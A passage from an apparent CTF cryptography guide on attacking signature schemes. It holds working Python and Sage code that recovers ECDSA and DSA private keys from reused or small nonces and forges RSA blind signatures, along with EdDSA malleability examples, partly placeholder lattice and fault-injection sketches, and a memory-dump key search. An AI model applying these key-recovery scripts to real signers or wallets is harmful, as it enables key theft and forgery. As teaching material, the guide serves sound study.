            r, s = sigdecode_der(der_sig, curve.order)
            return r, s, curve
        except:
            continue
    return None

## Manual DER parsing
def manual_parse_der(der_bytes):
    """
    DER format: 0x30 [length] 0x02 [r-length] [r] 0x02 [s-length] [s]
    """
    idx = 2  ## Skip 0x30 and total length
    
    ## Parse r
    idx += 1  ## Skip 0x02
    r_len = der_bytes[idx]
    idx += 1
    r = int.from_bytes(der_bytes[idx:idx+r_len], 'big')
    idx += r_len
    
    ## Parse s
    idx += 1  ## Skip 0x02
    s_len = der_bytes[idx]
    idx += 1
    s = int.from_bytes(der_bytes[idx:idx+s_len], 'big')
    
    return r, s
```

**Sage script for ECDSA private key recovery from nonce reuse:**
```python
## Save as recover_ecdsa.sage
def recover_key_from_nonce_reuse(r, s1, s2, h1, h2, n):
    """
    Complete ECDSA key recovery from two signatures with same nonce
    """
    ## Ensure all values are integers
    r, s1, s2, h1, h2, n = map(int, [r, s1, s2, h1, h2, n])
    
    ## Calculate k
    k_num = (h1 - h2) % n
    k_den = (s1 - s2) % n
    
    if k_den == 0:
        return None
    
    k = (k_num * inverse_mod(k_den, n)) % n
    
    ## Calculate private key
    d_num = (s1 * k - h1) % n
    d_den = r % n
    
    d = (d_num * inverse_mod(d_den, n)) % n
    
    return d

## Usage in SageMath:
## sage: load('recover_ecdsa.sage')
## sage: d = recover_key_from_nonce_reuse(r, s1, s2, h1, h2, n)
```

#### ECDSA CTF-Specific Techniques

**Bitcoin/Cryptocurrency signature analysis:**
```python
import hashlib
import ecdsa

def verify_bitcoin_signature(message, signature, pubkey):
    """
    Bitcoin uses secp256k1 with double SHA-256
    """
    ## Bitcoin message prefix
    msg_magic = b"\x18Bitcoin Signed Message:\n"
    msg_to_sign = msg_magic + len(message).to_bytes(1, 'little') + message
    
    ## Double SHA-256
    msg_hash = hashlib.sha256(hashlib.sha256(msg_to_sign).digest()).digest()
    
    vk = ecdsa.VerifyingKey.from_string(pubkey, curve=ecdsa.SECP256k1)
    
    try:
        return vk.verify_digest(signature, msg_hash)
    except:
        return False
```

**LLL-based attacks for biased nonces:**
```bash
## Install fpylll for lattice operations
pip3 install fpylll

## Use existing attack scripts
git clone https://github.com/josephsurin/lattice-based-cryptanalysis
cd lattice-based-cryptanalysis
```

**Timing attack simulation:**
```python
import time

def timing_attack_ecdsa(oracle_func, curve_order):
    """
    [Inference] Theoretical timing attack on ECDSA verification
    [Unverified] Requires precise timing measurements in real scenarios
    """
    timings = []
    
    for k_guess in range(1000):
        start = time.perf_counter()
        oracle_func(k_guess)
        end = time.perf_counter()
        timings.append((k_guess, end - start))
    
    ## Analyze timing correlations
    return sorted(timings, key=lambda x: x[1])
```

### DSA (Digital Signature Algorithm)

DSA is similar to ECDSA but operates over finite fields rather than elliptic curves. It uses parameters (p, q, g) where p is a large prime, q is a prime divisor of p-1, and g is a generator.

#### DSA Parameters and Operations

**Standard DSA parameters:**
```
p: 2048-bit or 3072-bit prime modulus
q: 256-bit prime (divisor of p-1)
g: generator with order q in Z_p*
x: private key (0 < x < q)
y: public key (y = g^x mod p)
```

**Signature generation:**
```
1. Select random k (0 < k < q)
2. r = (g^k mod p) mod q
3. s = k^(-1) * (H(m) + x * r) mod q
4. Signature is (r, s)
```

**Verification:**
```
1. w = s^(-1) mod q
2. u1 = H(m) * w mod q
3. u2 = r * w mod q
4. v = ((g^u1 * y^u2) mod p) mod q
5. Valid if v == r
```

#### DSA Vulnerabilities

**1. Nonce Reuse (Identical to ECDSA)**

```python
def dsa_nonce_reuse_recovery(q, r, s1, s2, h1, h2):
    """
    Recover DSA private key from nonce reuse
    Parameters identical to ECDSA attack
    """
    from Crypto.Util.number import inverse
    
    ## Calculate k
    k = ((h1 - h2) * inverse(s1 - s2, q)) % q
    
    ## Calculate private key x
    x = ((s1 * k - h1) * inverse(r, q)) % q
    
    return x, k

## Verification
def verify_recovered_key(p, q, g, x):
    """Compute public key from recovered private key"""
    y = pow(g, x, p)
    return y
```

**2. Weak Parameter Generation**

```python
def check_dsa_parameters(p, q, g):
    """
    Verify DSA parameters are properly generated
    """
    checks = {
        "q_divides_p_minus_1": (p - 1) % q == 0,
        "g_order_is_q": pow(g, q, p) == 1,
        "g_not_trivial": g > 1,
        "p_is_prime": None,  ## Requires primality test
        "q_is_prime": None   ## Requires primality test
    }
    
    return checks
```

**3. Small Subgroup Confinement Attack**

If parameters allow small subgroups:

```python
def small_subgroup_attack(p, q, g, signature_oracle):
    """
    [Inference] Force signatures into small subgroups
    Requires ability to provide malicious public keys
    """
    ## Find small factors of p-1
    from sympy import factorint
    
    factors = factorint(p - 1)
    small_factors = [f for f in factors.keys() if f != q and f < 10000]
    
    ## For each small factor, create generator
    ## [Unverified without specific implementation context]
    congruences = []
    
    for factor in small_factors:
        ## Generate element of order 'factor'
        h = pow(g, (p-1)//factor, p)
        ## Use in signature/verification to leak key bits
        pass
    
    return congruences
```

#### DSA Tools and Commands

**OpenSSL DSA operations:**
```bash
## Generate DSA parameters
openssl dsaparam -out dsaparam.pem 2048

## Generate DSA key using parameters
openssl gendsa -out dsa-private.pem dsaparam.pem
openssl dsa -in dsa-private.pem -pubout -out dsa-public.pem

## Sign with DSA
openssl dgst -sha256 -sign dsa-private.pem -out signature.der message.txt

## Verify DSA signature
openssl dgst -sha256 -verify dsa-public.pem -signature signature.der message.txt

## Extract DSA parameters
openssl dsa -in dsa-private.pem -text -noout
openssl dsa -pubin -in dsa-public.pem -text -noout
```

**Python DSA implementation:**
```python
from Crypto.PublicKey import DSA
from Crypto.Signature import DSS
from Crypto.Hash import SHA256

## Generate DSA key
key = DSA.generate(2048)

## Export
private_pem = key.export_key()
public_pem = key.publickey().export_key()

## Sign
h = SHA256.new(b"message")
signer = DSS.new(key, 'fips-186-3')
signature = signer.sign(h)

## Verify
verifier = DSS.new(key.publickey(), 'fips-186-3')
try:
    verifier.verify(h, signature)
    print("Valid")
except ValueError:
    print("Invalid")

## Extract parameters
print(f"p: {hex(key.p)}")
print(f"q: {hex(key.q)}")
print(f"g: {hex(key.g)}")
print(f"x (private): {hex(key.x)}")
print(f"y (public): {hex(key.y)}")
```

**Parse DSA signature:**
```python
def parse_dsa_signature(sig_bytes):
    """
    DSA signatures in DER format: same as ECDSA
    0x30 [length] 0x02 [r-length] [r] 0x02 [s-length] [s]
    """
    idx = 2
    
    ## Parse r
    idx += 1
    r_len = sig_bytes[idx]
    idx += 1
    r = int.from_bytes(sig_bytes[idx:idx+r_len], 'big')
    idx += r_len
    
    ## Parse s
    idx += 1
    s_len = sig_bytes[idx]
    idx += 1
    s = int.from_bytes(sig_bytes[idx:idx+s_len], 'big')
    
    return r, s
```

#### Cross-Scheme Attacks

**Converting between DSA and ECDSA attacks:**

Many DSA attacks directly apply to ECDSA since the signature equations are structurally identical:

```python
def unified_nonce_reuse_attack(q, r, s1, s2, h1, h2):
    """
    Works for both DSA and ECDSA
    q: field order (DSA) or curve order (ECDSA)
    """
    from Crypto.Util.number import inverse
    
    k = ((h1 - h2) * inverse(s1 - s2, q)) % q
    private_key = ((s1 * k - h1) * inverse(r, q)) % q
    
    return private_key, k
```

#### CTF-Specific DSA Scenarios

**Extracting k from side channel:**
```python
def recover_key_from_known_k(k, r, s, h, q):
    """
    If k is leaked through any means, recover private key directly
    """
    from Crypto.Util.number import inverse
    
    ## From s = k^(-1) * (h + x*r) mod q
    ## Solve for x: x = (s*k - h) * r^(-1) mod q
    x = ((s * k - h) * inverse(r, q)) % q
    
    return x
```

**Brute force small k values:**
```python
def bruteforce_small_k(p, q, g, r, s, h, max_k=10000):
    """
    If k is known to be small (poor randomness), brute force it
    """
    from Crypto.Util.number import inverse
    
    for k in range(1, max_k):
        ## Check if this k produces the correct r
        r_check = pow(g, k, p) % q
        
        if r_check == r:
            ## Recover private key
            x = ((s * k - h) * inverse(r, q)) % q
            return x, k
    
    return None, None
```

**Lattice attack for biased k:**
```python
## Requires SageMath environment
def dsa_biased_k_lattice_attack(signatures, bias_bits, q):
    """
    [Inference] Use LLL when MSBs/LSBs of k are known
    signatures: list of (r, s, h) tuples
    bias_bits: number of known bits
    
    [Unverified] Specific lattice construction depends on bias type
    """
    from sage.all import Matrix, ZZ
    
    n = len(signatures)
    
    ## Construct lattice matrix
    ## [Inference] Matrix structure varies based on bias location (MSB/LSB)
    B = Matrix(ZZ, n+2, n+2)
    
    ## Fill matrix based on signature equations
    ## ... implementation requires SageMath
    
    return None  ## Placeholder
```

#### Comparison Table

| Aspect | RSA Signatures | ECDSA | DSA |
|--------|---------------|-------|-----|
| Key Size (128-bit security) | 3072 bits | 256 bits | 3072-bit p, 256-bit q |
| Signature Size | 3072 bits | 512 bits | 512 bits |
| Main Weakness | Padding oracle, small e | Nonce reuse | Nonce reuse |
| Speed | Slowest | Fastest | Medium |
| Common in CTFs | Very common | Very common | Less common |

#### Important Tools Summary

```bash
## Multi-purpose RSA tool
git clone https://github.com/RsaCtfTool/RsaCtfTool.git

## Lattice-based attacks
git clone https://github.com/josephsurin/lattice-based-cryptanalysis

## Elliptic curve tools
pip3 install ecdsa pycryptodome sage

## General cryptography toolkit
pip3 install pwntools gmpy2 sympy
```

#### Key Takeaways for CTF Scenarios

1. **Always check for nonce reuse first** - search for duplicate r values in multiple signatures
2. **Extract and analyze all parameters** - small values or relationships between parameters often indicate vulnerabilities
3. **Test with known weak parameters** - use small primes, small exponents, or weak curves when generating challenges
4. **Look for implementation flaws** - improper padding checks, missing validations, or incorrect modular arithmetic
5. **Consider side channels** - timing attacks, fault injection, or leaked intermediate values

**[Inference]** In most CTF contexts, signature vulnerabilities involve mathematical weaknesses rather than protocol flaws. The most reliable attack vector remains nonce reuse across schemes.

---

### EdDSA

#### Core Concepts

EdDSA (Edwards-curve Digital Signature Algorithm) is a modern signature scheme using twisted Edwards curves, primarily Ed25519 (Curve25519) and Ed448 (Curve448-Goldilocks). It offers deterministic signatures, resistance to side-channel attacks, and faster verification than ECDSA.

**Key Properties:**
- Deterministic: Same message always produces same signature with same key
- No random nonce generation required (eliminates nonce reuse vulnerabilities)
- 64-byte signatures for Ed25519, 114-byte for Ed448
- Public keys: 32 bytes (Ed25519), 57 bytes (Ed448)
- Cofactor handling built into specification

#### Mathematical Foundation

Ed25519 uses the twisted Edwards curve: `-x² + y² = 1 - (121665/121666)x²y²` over the prime field `p = 2^255 - 19`.

**Signature Generation:**
```
r = H(h_b || ... || h_{2b-1} || M) mod L
R = rB
k = H(R || A || M) mod L
S = (r + k*a) mod L
Signature = (R, S)
```

Where:
- `H` = SHA-512
- `B` = base point
- `A` = public key (aB)
- `a` = private scalar
- `L` = order of base point
- `M` = message

**Verification:**
Check if `8SB = 8R + 8kA` (cofactor multiplication by 8 ensures subgroup check)

#### CTF Attack Vectors

**1. Key Recovery from Biased Nonces**

[Inference] While EdDSA is deterministic, implementation errors can introduce bias. If an implementation incorrectly generates the nonce `r`:

```python
## Vulnerable: Using weak randomness instead of proper hash
import hashlib
from Crypto.Util.number import *

## Check for biased nonce generation
def check_nonce_bias(signatures):
    """Analyze if nonces show statistical bias"""
    r_values = [int.from_bytes(sig[:32], 'little') for sig in signatures]
    
    ## Test for MSB bias
    bit_counts = [0] * 256
    for r in r_values:
        for i in range(256):
            if r & (1 << i):
                bit_counts[i] += 1
    
    ## Expected: ~50% for each bit
    for i, count in enumerate(bit_counts):
        ratio = count / len(r_values)
        if ratio < 0.4 or ratio > 0.6:
            print(f"Bit {i} shows bias: {ratio:.2%}")
```

**2. Malleability Attacks**

EdDSA signatures can be malleable if verification doesn't properly validate `S < L`. An attacker can add `L` to `S`:

```python
def create_malleable_signature(R, S, L):
    """Create alternative valid signature (if verification is weak)"""
    ## Valid if verifier doesn't check S < L
    S_prime = S + L
    return (R, S_prime)

## Exploitation check
L_ed25519 = 2**252 + 27742317777372353535851937790883648493
S = 12345678901234567890  ## Example
S_malleable = S + L_ed25519
```

**3. Public Key Substitution**

If application doesn't properly bind public key to context:

```python
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
from cryptography.hazmat.primitives import serialization

## Attacker generates own keypair
attacker_private = Ed25519PrivateKey.generate()
attacker_public = attacker_private.public_key()

## Signs arbitrary message
malicious_msg = b"attacker controlled data"
attacker_sig = attacker_private.sign(malicious_msg)

## If victim verifies with attacker's public key instead of expected key
## Signature validates despite being from wrong signer
```

**4. Small Subgroup Attacks**

Ed25519 has cofactor 8. If implementation doesn't multiply by cofactor during verification:

```bash
## Using SageMath for subgroup analysis
sage << EOF
p = 2^255 - 19
F = GF(p)
A = F(-1)
D = F(-121665/121666)
E = EllipticCurve(F, [0, A+D, 0, A*D, 0])

## Find small order points
print("Curve order:", E.order())
print("Checking for small order points...")

for i in range(1, 9):
    try:
        P = E.random_element() * (E.order() // 8)
        if P.order() == i:
            print(f"Point of order {i}: {P}")
    except:
        pass
EOF
```

#### Practical Tools & Commands

**Using Python cryptography library:**

```python
from cryptography.hazmat.primitives.asymmetric.ed25519 import (
    Ed25519PrivateKey, Ed25519PublicKey
)
from cryptography.hazmat.primitives import serialization

## Key generation
private_key = Ed25519PrivateKey.generate()
public_key = private_key.public_key()

## Signing
message = b"CTF{test_flag}"
signature = private_key.sign(message)
print(f"Signature length: {len(signature)}")  ## 64 bytes

## Verification
try:
    public_key.verify(signature, message)
    print("Valid signature")
except:
    print("Invalid signature")

## Export keys
private_bytes = private_key.private_bytes(
    encoding=serialization.Encoding.Raw,
    format=serialization.PrivateFormat.Raw,
    encryption_algorithm=serialization.NoEncryption()
)
public_bytes = public_key.public_bytes(
    encoding=serialization.Encoding.Raw,
    format=serialization.PublicFormat.Raw
)
```

**Using OpenSSL (Ed25519 support in OpenSSL 1.1.1+):**

```bash
## Generate Ed25519 key
openssl genpkey -algorithm ed25519 -out ed25519_private.pem

## Extract public key
openssl pkey -in ed25519_private.pem -pubout -out ed25519_public.pem

## Sign file
openssl pkeyutl -sign -inkey ed25519_private.pem -rawin -in message.txt -out signature.bin

## Verify signature
openssl pkeyutl -verify -pubin -inkey ed25519_public.pem -rawin -in message.txt -sigfile signature.bin

## View key details
openssl pkey -in ed25519_private.pem -text -noout
```

**Using libsodium/pwntools:**

```python
from pwn import *
import nacl.signing
import nacl.encoding

## Generate keypair
signing_key = nacl.signing.SigningKey.generate()
verify_key = signing_key.verify_key

## Sign
message = b"attack payload"
signed = signing_key.sign(message)
signature = signed.signature
print(f"Signature (hex): {signature.hex()}")

## Verify
try:
    verify_key.verify(message, signature)
    log.success("Signature valid")
except:
    log.failure("Signature invalid")

## Raw key extraction
private_raw = bytes(signing_key)  ## 32 bytes
public_raw = bytes(verify_key)    ## 32 bytes
```

#### CTF Challenge Patterns

**Pattern 1: Signature Forgery via Implementation Flaws**

```python
## Example vulnerable verifier (missing checks)
def vulnerable_verify(public_key, message, signature):
    """Missing critical validations"""
    R = signature[:32]
    S = signature[32:]
    
    ## BUG: Not checking if S < L
    ## BUG: Not checking if R is on curve
    ## BUG: Not multiplying by cofactor
    
    ## Implement proper check:
    L = 2**252 + 27742317777372353535851937790883648493
    S_int = int.from_bytes(S, 'little')
    
    if S_int >= L:
        return False  ## Reject malleable signatures
    
    ## Continue with verification...
```

**Pattern 2: Duplicate Signature Attack**

If system allows signature reuse across different contexts:

```python
## Exploit: Use signature from one context in another
def replay_attack(sig_from_context_a, message, context_b_verifier):
    """
    If signature doesn't include context binding,
    replay it in different context
    """
    ## Example: JWT token signed with EdDSA but no 'aud' claim
    ## Use token meant for service A on service B
    
    result = context_b_verifier(message, sig_from_context_a)
    return result
```

**Pattern 3: Weak Signature Verification**

```bash
## Finding implementations that don't verify properly
grep -r "ed25519" /challenge/src/ | grep -v "verify"
strings /challenge/binary | grep -i "signature"

## Check if binary validates S < L
objdump -d /challenge/binary | grep -A20 "verify" | grep cmp
```

#### Advanced Exploitation

**Fault Injection (Hardware CTFs):**

```python
## Simulating fault during signature generation
def fault_injected_sign(private_key, message, fault_position):
    """
    [Unverified] Theoretical fault injection during signing
    Real-world requires hardware access or emulation
    """
    ## Normal signing process
    h = hashlib.sha512(private_key + message).digest()
    r_hash = hashlib.sha512(h[32:] + message).digest()
    
    ## Inject fault at specific bit
    r_bytes = bytearray(r_hash)
    r_bytes[fault_position // 8] ^= (1 << (fault_position % 8))
    
    ## Continue with faulted r value
    ## This may leak information about private key
    return compute_signature_with_faulted_r(r_bytes, private_key, message)
```

**Batch Verification Exploits:**

Some implementations use batch verification for performance. [Inference] If improperly implemented, an attacker might sneak invalid signatures in a batch:

```python
def batch_verify_attack(public_keys, messages, signatures):
    """
    Batch verification: 8(S_1 + S_2 + ...)B =? 8(R_1 + R_2 + ...) + 8(k_1*A_1 + k_2*A_2 + ...)
    
    [Inference] If implementation has weakness in random coefficient generation,
    attacker might craft signatures that pass batch but fail individual checks
    """
    ## Example: All-zero random coefficients (catastrophic implementation bug)
    ## Would allow attacker to create offsetting invalid signatures
    pass
```

#### Forensics & Analysis

**Extracting EdDSA Keys from Memory:**

```bash
## Search for Ed25519 private keys (32 bytes of high entropy)
strings memory.dump | grep -P '^[A-Za-z0-9+/]{43}=$' > potential_keys.txt

## Test each candidate
while read key; do
    echo "$key" | base64 -d > test_key.bin
    if [ $(stat -c%s test_key.bin) -eq 32 ]; then
        python3 test_ed25519_key.py test_key.bin
    fi
done < potential_keys.txt
```

**Timing Analysis:**

```python
import time
import statistics

def timing_attack_attempt(verify_function, public_key, message, signatures):
    """
    [Unverified] EdDSA should be constant-time, but implementations may vary
    """
    timings = []
    
    for sig in signatures:
        start = time.perf_counter_ns()
        try:
            verify_function(public_key, message, sig)
        except:
            pass
        end = time.perf_counter_ns()
        timings.append(end - start)
    
    print(f"Mean: {statistics.mean(timings)}")
    print(f"Stdev: {statistics.stdev(timings)}")
    print(f"Range: {max(timings) - min(timings)}")
```

---

### Blind Signatures

#### Core Concepts

Blind signatures allow a signer to sign a message without seeing its content. The message is "blinded" before signing, then "unblinded" after signature. Used in anonymous voting, digital cash, and privacy protocols.

**Properties:**
- Unlinkability: Signer cannot link message-signature pairs later
- Unforgeability: Only signer can create valid signatures
- Blindness: Signer learns nothing about message content

#### RSA Blind Signatures

Most common implementation uses RSA's multiplicative homomorphism.

**Protocol:**

1. **User blinds message:**
   ```
   m' = m * r^e mod N
   ```
   Where `r` is random blinding factor, `e` is public exponent, `N` is modulus

2. **Signer signs blinded message:**
   ```
   s' = (m')^d mod N
   ```
   Where `d` is private exponent

3. **User unblinds signature:**
   ```
   s = s' * r^(-1) mod N = m^d mod N
   ```

4. **Verification (standard RSA):**
   ```
   m = s^e mod N
   ```

#### Implementation

```python
from Crypto.PublicKey import RSA
from Crypto.Util.number import inverse, GCD
import random

class RSABlindSignature:
    def __init__(self, key_size=2048):
        self.key = RSA.generate(key_size)
        self.e = self.key.e
        self.d = self.key.d
        self.N = self.key.n
        
    def blind_message(self, message, r=None):
        """User blinds message"""
        m = int.from_bytes(message, 'big')
        
        if r is None:
            ## Generate random blinding factor coprime to N
            while True:
                r = random.randint(2, self.N - 1)
                if GCD(r, self.N) == 1:
                    break
        
        ## m' = m * r^e mod N
        m_blinded = (m * pow(r, self.e, self.N)) % self.N
        return m_blinded, r
    
    def sign_blinded(self, m_blinded):
        """Signer signs blinded message (doesn't see original)"""
        ## s' = (m')^d mod N
        s_blinded = pow(m_blinded, self.d, self.N)
        return s_blinded
    
    def unblind_signature(self, s_blinded, r):
        """User unblinds signature"""
        ## s = s' * r^(-1) mod N
        r_inv = inverse(r, self.N)
        s = (s_blinded * r_inv) % self.N
        return s
    
    def verify(self, message, signature):
        """Standard RSA verification"""
        m = int.from_bytes(message, 'big')
        s = signature
        m_recovered = pow(s, self.e, self.N)
        return m == m_recovered

## Usage
blind_sig = RSABlindSignature()

## User side
message = b"secret vote: candidate A"
m_blinded, r = blind_sig.blind_message(message)

## Signer side (doesn't see original message)
s_blinded = blind_sig.sign_blinded(m_blinded)

## User unblinds
s = blind_sig.unblind_signature(s_blinded, r)

## Verify
assert blind_sig.verify(message, s)
print("Blind signature valid!")
```

#### CTF Attack Vectors

**1. Blinding Factor Reuse**

If user reuses blinding factor `r` for multiple messages:

```python
def attack_reused_blinding_factor(m1, s1, m2, s2, e, N):
    """
    If same r used for both signatures:
    s1 = m1^d * r^(-1) mod N
    s2 = m2^d * r^(-1) mod N
    
    [Inference] Can recover relationship between messages
    """
    ## s1/s2 = (m1/m2)^d mod N
    ## If m1, m2 known, can analyze
    
    ratio = (s1 * inverse(s2, N)) % N
    ## Further analysis depends on specific values
    return ratio

def forge_with_reused_r(known_m, known_s, target_m, r, e, N):
    """
    [Inference] If attacker knows one message-signature pair with its r,
    can potentially forge signatures for other messages
    """
    ## known_s = known_m^d * r^(-1) mod N
    ## Can compute signatures for related messages
    pass
```

**2. Multiplicative Property Abuse**

RSA signatures are multiplicatively homomorphic:

```python
def forge_signature_via_multiplication(m1, s1, m2, s2, target_m, e, N):
    """
    Exploit: s1 * s2 = (m1 * m2)^d mod N
    If target_m = m1 * m2 mod N, can forge signature
    """
    if target_m == (m1 * m2) % N:
        forged_sig = (s1 * s2) % N
        ## Verify
        assert pow(forged_sig, e, N) == target_m
        return forged_sig
    return None

## Example attack
def factorization_attack(target_m, known_sigs, e, N):
    """
    Try to factor target_m into product of messages with known signatures
    """
    known_messages = list(known_sigs.keys())
    
    for m1 in known_messages:
        for m2 in known_messages:
            if (m1 * m2) % N == target_m:
                forged = (known_sigs[m1] * known_sigs[m2]) % N
                print(f"Forged signature for {target_m}")
                return forged
    
    ## Try with inverses
    for m1 in known_messages:
        target_factor = (target_m * inverse(m1, N)) % N
        if target_factor in known_sigs:
            forged = (known_sigs[target_factor] * known_sigs[m1]) % N
            return forged
    
    return None
```

**3. Weak Blinding Factor Generation**

```python
def attack_weak_blinding(oracle_sign, e, N, message):
    """
    If implementation uses weak random for blinding factor
    """
    ## Example: predictable PRNG
    import random
    random.seed(12345)  ## Known/predictable seed
    
    ## Attacker can predict blinding factor
    r_predicted = random.randint(2, N - 1)
    
    ## Request blind signature from oracle
    m = int.from_bytes(message, 'big')
    m_blinded = (m * pow(r_predicted, e, N)) % N
    s_blinded = oracle_sign(m_blinded)
    
    ## Unblind with predicted r
    r_inv = inverse(r_predicted, N)
    s = (s_blinded * r_inv) % N
    
    return s
```

**4. Parallel Attack (Multiple Blind Signatures)**

```python
def parallel_blind_signature_attack(oracle_sign, target_message, e, N):
    """
    [Inference] Request multiple blind signatures to potentially
    gather information or exploit implementation flaws
    """
    m = int.from_bytes(target_message, 'big')
    
    ## Request many blind signatures with different r values
    signatures = []
    blinding_factors = []
    
    for _ in range(100):
        r = random.randint(2, N - 1)
        while GCD(r, N) != 1:
            r = random.randint(2, N - 1)
        
        m_blinded = (m * pow(r, e, N)) % N
        s_blinded = oracle_sign(m_blinded)
        
        signatures.append(s_blinded)
        blinding_factors.append(r)
    
    ## Analyze for patterns or implementation flaws
    ## Example: timing analysis, response patterns, etc.
    return signatures, blinding_factors
```

#### Practical Tools

**Using PyCryptodome:**

```python
from Crypto.PublicKey import RSA
from Crypto.Signature import pkcs1_15
from Crypto.Hash import SHA256
from Crypto.Util.number import inverse, bytes_to_long, long_to_bytes

def blind_sign_message(rsa_key, message):
    """Complete blind signature protocol"""
    ## Generate blinding factor
    while True:
        r = random.randint(2, rsa_key.n - 1)
        if GCD(r, rsa_key.n) == 1:
            break
    
    ## Hash message
    h = SHA256.new(message)
    m = bytes_to_long(h.digest())
    
    ## Blind
    m_blind = (m * pow(r, rsa_key.e, rsa_key.n)) % rsa_key.n
    
    ## Sign (using raw RSA, not PKCS#1 v1.5 padding)
    s_blind = pow(m_blind, rsa_key.d, rsa_key.n)
    
    ## Unblind
    s = (s_blind * inverse(r, rsa_key.n)) % rsa_key.n
    
    ## Verify
    m_check = pow(s, rsa_key.e, rsa_key.n)
    assert m == m_check
    
    return long_to_bytes(s)
```

**Testing Script:**

```bash
#!/bin/bash
## test_blind_sig.sh

cat << 'EOF' > blind_sig_test.py
from Crypto.PublicKey import RSA
from Crypto.Util.number import inverse, GCD
import random

key = RSA.generate(2048)
print(f"N = {key.n}")
print(f"e = {key.e}")
print(f"d = {key.d}")

message = b"test message"
m = int.from_bytes(message, 'big')

## Blind
r = random.randint(2, key.n - 1)
while GCD(r, key.n) != 1:
    r = random.randint(2, key.n - 1)

m_blind = (m * pow(r, key.e, key.n)) % key.n
print(f"\nBlinded message: {m_blind}")

## Sign
s_blind = pow(m_blind, key.d, key.n)
print(f"Blinded signature: {s_blind}")

## Unblind
s = (s_blind * inverse(r, key.n)) % key.n
print(f"Unblinded signature: {s}")

## Verify
assert m == pow(s, key.e, key.n)
print("\n✓ Signature valid!")
EOF

python3 blind_sig_test.py
```

#### Elliptic Curve Blind Signatures

**Schnorr-based Blind Signatures:**

```python
from hashlib import sha256
from random import randint

class SchnorrBlindSig:
    def __init__(self, p, g, q):
        """
        p: prime (modulus)
        g: generator
        q: order of g
        """
        self.p = p
        self.g = g
        self.q = q
        
        ## Generate private key
        self.x = randint(1, q - 1)
        ## Public key
        self.y = pow(g, self.x, p)
    
    def signer_commit(self):
        """Signer generates commitment"""
        k = randint(1, self.q - 1)
        r = pow(self.g, k, self.p)
        return r, k
    
    def user_blind(self, message, r, alpha, beta):
        """
        User blinds challenge
        alpha, beta: random blinding factors
        """
        m = int.from_bytes(message, 'big')
        
        ## Blind the commitment
        r_prime = (r * pow(self.g, alpha, self.p) * pow(self.y, beta, self.p)) % self.p
        
        ## Compute challenge
        c_prime = int(sha256(str(r_prime).encode() + message).hexdigest(), 16) % self.q
        
        ## Blind challenge
        c = (c_prime + beta) % self.q
        
        return c, c_prime, r_prime
    
    def signer_respond(self, c, k):
        """Signer creates response to challenge"""
        s_prime = (k + c * self.x) % self.q
        return s_prime
    
    def user_unblind(self, s_prime, alpha):
        """User unblinds signature"""
        s = (s_prime + alpha) % self.q
        return s
    
    def verify(self, message, r_prime, s, c_prime):
        """Verify blind signature"""
        ## Check: g^s = r' * y^c'
        lhs = pow(self.g, s, self.p)
        rhs = (r_prime * pow(self.y, c_prime, self.p)) % self.p
        
        ## Verify challenge
        c_check = int(sha256(str(r_prime).encode() + message).hexdigest(), 16) % self.q
        
        return lhs == rhs and c_prime == c_check
```

#### CTF Challenge Patterns

**Pattern 1: Oracle-based Signature Extraction**

```python
def oracle_based_attack(sign_oracle, target_message, e, N):
    """
    Given: Oracle that blindly signs messages
    Goal: Get signature on target_message
    """
    m = int.from_bytes(target_message, 'big')
    
    ## Choose blinding factor
    r = random.randint(2, N - 1)
    while GCD(r, N) != 1:
        r = random.randint(2, N - 1)
    
    ## Blind target message
    m_blinded = (m * pow(r, e, N)) % N
    
    ## Get blind signature from oracle
    s_blinded = sign_oracle(m_blinded)
    
    ## Unblind
    s = (s_blinded * inverse(r, N)) % N
    
    ## Now have valid signature on target_message
    return s
```

**Pattern 2: Restricted Message Space**

```python
def bypass_message_restrictions(allowed_messages, target_message, e, N, sign_oracle):
    """
    [Inference] If oracle only signs messages from allowed set,
    try to construct target via multiplication
    """
    target = int.from_bytes(target_message, 'big')
    
    ## Get signatures for allowed messages
    sigs = {}
    for msg in allowed_messages:
        m = int.from_bytes(msg, 'big')
        ## Directly request or blind-sign allowed message
        sig = sign_oracle(m)
        sigs[m] = sig
    
    ## Try to factor target into allowed messages
    for m1 in sigs:
        if target % m1 == 0:
            m2 = target // m1
            if m2 in sigs:
                ## target = m1 * m2
                forged = (sigs[m1] * sigs[m2]) % N
                ## Verify
                if pow(forged, e, N) == target % N:
                    return forged
    
    return None
```

---

### Multisignatures

#### Core Concepts

Multisignature schemes allow multiple signers to jointly sign a message, producing a single aggregate signature. Key applications: cryptocurrency multisig wallets, threshold signatures, and distributed authorization.

**Types:**
- **Simple Multisig**: Concatenate individual signatures
- **Aggregate Multisig**: Combine signatures into single element (BLS)
- **Threshold Multisig**: Require t-of-n signers (Schnorr, FROST)
- **MuSig**: Schnorr-based interactive multisig with key aggregation

#### MuSig Protocol (Schnorr-based)

**Three-round protocol:**

1. **Commitment Round**: Each signer commits to nonce
2. **Nonce Round**: Signers reveal nonces
3. **Signature Round**: Signers create partial signatures

**Key Aggregation:**
```
L = H(X_1 || X_2 || ... || X_n)
a_i = H(L || X_i)
X_agg = sum(a_i * X_i)
```

**Signing:**
```
R_agg = sum(R_i)
c = H(X_agg || R_agg || m)
s_i = r_i + c * a_i * x_i
s_agg = sum(s_i)
```

#### Implementation

```python
from hashlib import sha256
from dataclasses import dataclass
from typing import List, Tuple

@dataclass
class Point:
    """Elliptic curve point"""
    x: int
    y: int

class MuSig:
    """Simplified MuSig implementation for secp256k1-like curve"""
    
    def __init__(self, p, a, b, G, n):
        """
        Curve parameters:
        p: prime field
        a, b: curve coefficients (y^2 = x^3 + ax + b)
        G: generator point
        n: order of G
        """
        self.p = p
        self.a = a
        self.b = b
        self.G = G
        self.n = n
    
    def point_add(self, P1: Point, P2: Point) -> Point:
        """Elliptic curve point addition"""
        if P1.x == P2.x and P1.y == P2.y:
            ## Point doubling
            s = (3 * P1.x**2 + self.a) * pow(2 * P1.y, -1, self.p) % self.p
        else:
            s = (P2.y - P1.y) * pow(P2.x - P1.x, -1, self.p) % self.p
        
        x3 = (s**2 - P1.x - P2.x) % self.p
        y3 = (s * (P1.x - x3) - P1.y) % self.p
        
        return Point(x3, y3)
    
    def point_mul(self, k: int, P: Point) -> Point:
        """Scalar multiplication"""
        if k == 0:
            return None  ## Point at infinity
        
        result = P
        k_bin = bin(k)[3:]  ## Remove '0b' and first bit
        
        for bit in k_bin:
            result = self.point_add(result, result)
            if bit == '1':
                result = self.point_add(result, P)
        
        return result
    
    def aggregate_keys(self, public_keys: List[Point]) -> Tuple[Point, List[int]]:
        """
